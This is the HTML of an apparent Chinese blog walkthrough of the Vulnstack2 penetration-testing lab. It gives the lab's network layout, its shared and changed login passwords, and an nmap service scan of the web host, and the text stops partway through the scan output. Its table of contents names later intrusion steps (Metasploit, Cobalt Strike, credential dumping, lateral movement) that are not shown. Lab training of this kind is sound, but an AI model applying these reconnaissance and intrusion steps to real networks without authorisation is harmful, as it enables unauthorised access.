@@ -1,0 +1,1524 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="红日靶场2">
+<title>Vulnstack2</title>
+
+<link rel='canonical' href='https://gsygsr.github.io/shentou/vulnstack/vulnstack2/'>
+
+<link rel="stylesheet" href="/scss/style.min.4574748025b73b0369492ab661900878369bf003d477e5f5c673ee527faf3df7.css"><meta property='og:title' content="Vulnstack2">
+<meta property='og:description' content="红日靶场2">
+<meta property='og:url' content='https://gsygsr.github.io/shentou/vulnstack/vulnstack2/'>
+<meta property='og:site_name' content='一个俗人'>
+<meta property='og:type' content='article'><meta property='article:section' content='Shentou' /><meta property='article:published_time' content='2025-03-03T14:57:16&#43;08:00'/><meta property='article:modified_time' content='2025-03-03T15:27:11&#43;08:00'/><meta property='og:image' content='https://gsygsr.github.io/shentou/vulnstack/vulnstack2/15.jpg' />
+<meta name="twitter:title" content="Vulnstack2">
+<meta name="twitter:description" content="红日靶场2"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://gsygsr.github.io/shentou/vulnstack/vulnstack2/15.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu7c49ec7d0c73aa09934b289b1d767e6f_13051_300x0_resize_box_3.png" width="300"
+                            height="302" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🤡</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">一个俗人</a></h1>
+            <h2 class="site-description">welcome two 一个俗人&#39;s 博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/gsygsr/gsygsr.github.io.git'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://gsygsr.github.io/en/" >English</option>
+                                
+                                    <option value="https://gsygsr.github.io/" selected>中文</option>
+                                
+                                    <option value="https://gsygsr.github.io/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#靶机配置">靶机配置</a></li>
+    <li><a href="#信息收集">信息收集</a>
+      <ol>
+        <li><a href="#扫端口">扫端口</a></li>
+      </ol>
+    </li>
+    <li><a href="#渗透">渗透</a>
+      <ol>
+        <li><a href="#msf">msf</a></li>
+        <li><a href="#cs">cs</a></li>
+        <li><a href="#msf提权">msf提权</a></li>
+      </ol>
+    </li>
+    <li><a href="#内网探测">内网探测</a>
+      <ol>
+        <li><a href="#搭建隧道">搭建隧道</a></li>
+        <li><a href="#探测主机">探测主机</a></li>
+        <li><a href="#获取明文密码">获取明文密码</a></li>
+      </ol>
+    </li>
+    <li><a href="#横向移动">横向移动</a>
+      <ol>
+        <li><a href="#dc">DC</a></li>
+        <li><a href="#pc">PC</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/shentou/vulnstack/vulnstack2/">
+                <img src="/shentou/vulnstack/vulnstack2/15_hu85a8d744ab8dd95322370522d1a3e8dc_132814_800x0_resize_q75_box.jpg"
+                        srcset="/shentou/vulnstack/vulnstack2/15_hu85a8d744ab8dd95322370522d1a3e8dc_132814_800x0_resize_q75_box.jpg 800w, /shentou/vulnstack/vulnstack2/15_hu85a8d744ab8dd95322370522d1a3e8dc_132814_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="450" 
+                        loading="lazy"
+                        alt="Featured image of post Vulnstack2" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F/" style="background-color: #2a9d8f; color: #fff;">
+                渗透
+            </a>
+        
+            <a href="/categories/vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/" style="background-color: #2a9d8f; color: #fff;">
+                Vulnstack(红日)靶场
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/shentou/vulnstack/vulnstack2/">Vulnstack2</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            红日靶场2
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 03, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="靶机配置">靶机配置
+</h2><p><img src="/shentou/vulnstack/vulnstack2/1726381478554-812860e2-73e1-422e-b496-9e733ce3d852.png"
+	width="1125"
+	height="871"
+	srcset="/shentou/vulnstack/vulnstack2/1726381478554-812860e2-73e1-422e-b496-9e733ce3d852_hudaf51e300ca1c7588bd276d3cbd69490_363286_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726381478554-812860e2-73e1-422e-b496-9e733ce3d852_hudaf51e300ca1c7588bd276d3cbd69490_363286_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="129"
+		data-flex-basis="309px"
+	
+></p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726295032140-7ef1db86-f3a1-45ed-937c-e3c184a091f4.png"
+	width="699"
+	height="574"
+	srcset="/shentou/vulnstack/vulnstack2/1726295032140-7ef1db86-f3a1-45ed-937c-e3c184a091f4_hu05e52be93e522391f0d2a393043dcf3a_27995_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726295032140-7ef1db86-f3a1-45ed-937c-e3c184a091f4_hu05e52be93e522391f0d2a393043dcf3a_27995_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="121"
+		data-flex-basis="292px"
+	
+></p>
+<p>给了三个靶机,WEB和PC需要两张网卡,一个nat,一个仅主机.DC不需要和外网通信,所以只需要一张仅主机网卡</p>
+<p><code>靶场统一登录密码：1qaz@WSX</code></p>
+<p><font style="color:rgb(33, 37, 41);">WEB和DC的登录密码被我改为了</font><code>123456Abc</code></p>
+<p><font style="color:rgb(33, 37, 41);">WEB:</font></p>
+<p><code>192.168.254.130</code><font style="color:rgb(33, 37, 41);">外     </font><code>10.10.10.80</code><font style="color:rgb(33, 37, 41);">内</font></p>
+<p><font style="color:rgb(33, 37, 41);">PC:</font></p>
+<p><code>192.168.254.129</code><font style="color:rgb(33, 37, 41);">外   </font><code>10.10.10.128</code><font style="color:rgb(33, 37, 41);">内</font></p>
+<p><font style="color:rgb(33, 37, 41);">DC:</font></p>
+<p><code>10.10.10.10</code><font style="color:rgb(33, 37, 41);">内</font></p>
+<p><font style="color:rgb(33, 37, 41);">kali:</font></p>
+<p><code>192.168.254.128</code></p>
+<p><font style="color:rgb(33, 37, 41);">WEB启动一下</font></p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726384615549-4a430109-c751-4cb5-8047-c6b1e028dd87.png"
+	width="842"
+	height="390"
+	srcset="/shentou/vulnstack/vulnstack2/1726384615549-4a430109-c751-4cb5-8047-c6b1e028dd87_hu9d561ec5c31e7a2931f2fd80edfb0653_40087_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726384615549-4a430109-c751-4cb5-8047-c6b1e028dd87_hu9d561ec5c31e7a2931f2fd80edfb0653_40087_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="215"
+		data-flex-basis="518px"
+	
+></p>
+<h2 id="信息收集">信息收集
+</h2><h3 id="扫端口">扫端口
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="n">sC</span> <span class="mf">192.168.254.130</span>
+</span></span><span class="line"><span class="cl"><span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.94</span><span class="n">SVN</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">15</span> <span class="mi">03</span><span class="p">:</span><span class="mi">22</span> <span class="n">EDT</span>
+</span></span><span class="line"><span class="cl"><span class="n">Stats</span><span class="p">:</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">25</span> <span class="n">elapsed</span><span class="p">;</span> <span class="mi">0</span> <span class="n">hosts</span> <span class="n">completed</span> <span class="p">(</span><span class="mi">1</span> <span class="n">up</span><span class="p">),</span> <span class="mi">1</span> <span class="n">undergoing</span> <span class="n">Service</span> <span class="n">Scan</span>
+</span></span><span class="line"><span class="cl"><span class="n">Service</span> <span class="n">scan</span> <span class="n">Timing</span><span class="p">:</span> <span class="n">About</span> <span class="mf">58.33</span><span class="o">%</span> <span class="n">done</span><span class="p">;</span> <span class="n">ETC</span><span class="p">:</span> <span class="mi">03</span><span class="p">:</span><span class="mi">23</span> <span class="p">(</span><span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">15</span> <span class="n">remaining</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Stats</span><span class="p">:</span> <span class="mi">0</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">34</span> <span class="n">elapsed</span><span class="p">;</span> <span class="mi">0</span> <span class="n">hosts</span> <span class="n">completed</span> <span class="p">(</span><span class="mi">1</span> <span class="n">up</span><span class="p">),</span> <span class="mi">1</span> <span class="n">undergoing</span> <span class="n">Script</span> <span class="n">Scan</span>
+</span></span><span class="line"><span class="cl"><span class="n">NSE</span> <span class="n">Timing</span><span class="p">:</span> <span class="n">About</span> <span class="mf">99.94</span><span class="o">%</span> <span class="n">done</span><span class="p">;</span> <span class="n">ETC</span><span class="p">:</span> <span class="mi">03</span><span class="p">:</span><span class="mi">24</span> <span class="p">(</span><span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="n">remaining</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">localhost</span> <span class="p">(</span><span class="mf">192.168.254.130</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.00022</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">988</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>      <span class="n">VERSION</span>
+</span></span><span class="line"><span class="cl"><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">http</span>         <span class="n">Microsoft</span> <span class="n">IIS</span> <span class="n">httpd</span> <span class="mf">7.5</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">IIS</span><span class="o">/</span><span class="mf">7.5</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Site</span> <span class="n">doesn</span><span class="s1">&#39;t have a title.</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="n">Potentially</span> <span class="n">risky</span> <span class="n">methods</span><span class="p">:</span> <span class="n">TRACE</span>
+</span></span><span class="line"><span class="cl"><span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>        <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>  <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
+</span></span><span class="line"><span class="cl"><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2008</span> <span class="n">R2</span> <span class="n">Standard</span> <span class="mi">7601</span> <span class="n">Service</span> <span class="n">Pack</span> <span class="mi">1</span> <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1433</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ms</span><span class="o">-</span><span class="n">sql</span><span class="o">-</span><span class="n">s</span>     <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="mi">2008</span> <span class="n">R2</span> <span class="mf">10.50.4000.00</span><span class="p">;</span> <span class="n">SP2</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ms</span><span class="o">-</span><span class="n">sql</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mf">192.168.254.130</span><span class="p">:</span><span class="mi">1433</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="n">Version</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>       <span class="n">name</span><span class="p">:</span> <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="mi">2008</span> <span class="n">R2</span> <span class="n">SP2</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>       <span class="n">number</span><span class="p">:</span> <span class="mf">10.50.4000.00</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>       <span class="n">Product</span><span class="p">:</span> <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="mi">2008</span> <span class="n">R2</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>       <span class="n">Service</span> <span class="n">pack</span> <span class="n">level</span><span class="p">:</span> <span class="n">SP2</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>       <span class="n">Post</span><span class="o">-</span><span class="n">SP</span> <span class="n">patches</span> <span class="n">applied</span><span class="p">:</span> <span class="n">false</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>    <span class="n">TCP</span> <span class="n">port</span><span class="p">:</span> <span class="mi">1433</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">15</span><span class="n">T07</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">20</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="mi">0</span><span class="n">s</span> <span class="kn">from</span> <span class="nn">scanner</span> <span class="n">time</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">SSL_Self_Signed_Fallback</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">15</span><span class="n">T07</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">05</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2054</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">15</span><span class="n">T07</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">05</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ms</span><span class="o">-</span><span class="n">sql</span><span class="o">-</span><span class="n">ntlm</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mf">192.168.254.130</span><span class="p">:</span><span class="mi">1433</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="n">Target_Name</span><span class="p">:</span> <span class="n">DE1AY</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="n">NetBIOS_Domain_Name</span><span class="p">:</span> <span class="n">DE1AY</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="n">NetBIOS_Computer_Name</span><span class="p">:</span> <span class="n">WEB</span>
